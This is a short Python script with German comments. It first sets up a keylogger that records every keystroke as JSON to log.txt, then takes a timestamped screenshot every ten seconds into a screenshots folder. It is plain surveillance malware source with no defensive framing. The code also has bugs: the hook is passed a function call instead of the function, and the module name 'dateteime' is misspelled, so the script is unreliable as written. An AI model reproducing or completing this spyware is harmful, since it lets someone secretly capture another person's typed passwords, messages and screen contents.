
#Erstellen eines Keylogger. Die Daten werden im JSON Format in log.txt abgelegt.
import keyboard
import json
keyboard.unhook_all()

file = open("./log.txt", "w", encoding="utf-8")

def on_key(key):
	file.write(json.dumps(key.__dict__) + "\n")
	file.flush()
	
keyboard.hook(on_key())

#Hier wird in 10 Sekunden Abstand ein Screenshot erstellt. Die Bilder werden mit Datum und Zeitangabe im Verzeichnis ./screenshots abgelegt
import dateteime
import pyautogui
import time
import os

if not os.path.exists("./screenshots"):
	os.mkdir("./screenshots")
	
while True:
	time.sleep(10)
	current = dateteime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
	filename = "./screenshots/" + current + ".jpg"
	pyautogui.screenshot(filename)
	
	
	
	

